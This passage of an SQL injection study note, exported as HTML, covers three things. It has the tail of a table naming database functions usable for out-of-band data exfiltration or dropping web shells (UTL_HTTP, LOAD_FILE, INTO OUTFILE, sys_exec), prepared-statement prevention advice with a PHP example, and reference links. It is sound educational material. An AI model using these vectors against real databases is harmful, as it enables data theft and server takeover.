style="width:169.97500610351562px"><code>dblink</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">❌ <strong>DISABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires installing the <code>dblink</code> extension</td></tr><tr id="2261e11f-d73c-80ed-b43b-e7f1439791bc"><td id="UqJE" class="" style="width:97px"><strong>Oracle</strong></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>UTL_HTTP</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong> (with limits)</td><td id="hcS}" class="" style="width:299.8500061035156px">Available by default but requires <code>EXECUTE</code> privilege</td></tr><tr id="2261e11f-d73c-80f9-ac62-e27298993b70"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>HTTPURITYPE</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Often blocked by outbound firewall</td></tr><tr id="2261e11f-d73c-80aa-931f-cb47cc0c7104"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>DBMS_LDAP</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires specific privileges and configuration</td></tr><tr id="2261e11f-d73c-8080-93ac-f91edbf4e98f"><td id="UqJE" class="" style="width:97px"><strong>MySQL</strong></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>LOAD_FILE()</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">As long as file is in accessible filesystem; UNC paths may trigger DNS</td></tr><tr id="2261e11f-d73c-8013-a38b-cf805be486c7"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>INTO OUTFILE</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires write permissions; can be used to drop web shells</td></tr><tr id="2261e11f-d73c-807c-972c-ebd8e4988857"><td id="UqJE" class="" style="width:97px"><strong>MariaDB</strong></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>sys_exec()</code> / <code>sys_eval()</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">❌ <strong>DISABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires enabling <code>sql_shell</code> or <code>userstat</code> plugin</td></tr></tbody></table><hr id="2261e11f-d73c-8083-b1f3-d01043dd76c8"/><h1 id="2261e11f-d73c-806f-94b2-d101c87093c1" class="">9. Prevent SQL injection</h1><p id="2261e11f-d73c-8053-8316-f1923a78df2b" class="">This vulnerability SQLi then root cause is developer allow user can direct input to query and we can insert payload to query after forward to DBMS execute. Result is we change structure of query and purpose of them. Prevent this vulnerability we can use technique call Prepare statement in write query of backend. </p><h3 id="2261e11f-d73c-8044-b6c2-d8df0d1ef87e" class="">How to Prepare statement work?</h3><p id="2261e11f-d73c-8079-a564-ea6425af04b3" class="">Prepare statement work by it will build structure of query before count value to query.</p><p id="2261e11f-d73c-804a-aec1-e3d10aeb05c3" class="">Example in PHP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2261e11f-d73c-801f-aa8c-db4c5362652f" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">// prepare statement
+	$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE username = ?&quot;);
+	$stmt-&gt;bind_param(&quot;s&quot;, $username); // &quot;s&quot; = string
+	
+	// const value
+	$username = &#x27;admin&#x27;;
+	$stmt-&gt;execute();</code></pre><p id="2261e11f-d73c-80a2-86fd-ed7ba93827b0" class="">Don’t using prepare statement:</p><figure id="2261e11f-d73c-8038-8c0f-cd360517e4b7" class="image"><a href="image%205.png"><img style="width:710px" src="image%205.png"/></a></figure><p id="2261e11f-d73c-8023-9b8f-d08b7fc37bdb" class="">Using prepare statement:</p><figure id="2261e11f-d73c-8081-82a7-fd203c13dbee" class="image"><a href="image%206.png"><img style="width:710px" src="image%206.png"/></a></figure><p id="2261e11f-d73c-8088-a18a-ea27f73148bb" class="">
+	</p><hr id="2261e11f-d73c-8071-bf2f-cea5ec940623"/><p id="2261e11f-d73c-8079-8dab-e0d83359c659" class="">
+	</p><h1 id="2261e11f-d73c-8036-8b00-e7bad24465f9" class="">10. Cheetsheet</h1><h3 id="2261e11f-d73c-80c6-881f-fd55c40639b4" class=""><mark class="highlight-red"><strong><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/</a></strong></mark></h3><h3 id="2261e11f-d73c-8015-875f-f12fdfdd47a4" class=""><mark class="highlight-red"><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></mark></h3><p id="2261e11f-d73c-80e0-9486-dac3678269b3" class="">
+	</p><hr id="2261e11f-d73c-80ad-b239-c3b7da481344"/><h1 id="2261e11f-d73c-80ad-b8e8-e39fb4bd84e8" class="">11. Preference</h1><ol type="1" id="2261e11f-d73c-800f-b5a0-db54f83acf49" class="numbered-list" start="1"><li><a href="https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli">https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli</a></li></ol><ol type="1" id="2261e11f-d73c-80f6-9e0e-e682c52eaee8" class="numbered-list" start="2"><li><a href="https://www.acunetix.com/websitesecurity/sql-injection2/#:~:text=Error%2Dbased%20SQLi%20is%20an,to%20enumerate%20an%20entire%20database">https://www.acunetix.com/websitesecurity/sql-injection2/#:~:text=Error-based SQLi is an,to enumerate an entire database</a>.</li></ol><ol type="1" id="2261e11f-d73c-804d-949d-e415c92a5977" class="numbered-list" start="3"><li><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></li></ol><hr id="2261e11f-d73c-80f2-b1dd-e351bfa953b2"/><h1 id="2261e11f-d73c-804d-a4da-efcc394af960" class="">______________________<mark class="highlight-red"><strong>Thank you</strong></mark>_____________________</h1><p id="2261e11f-d73c-8043-94a3-d1e4295cf91f" class="">
+	</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
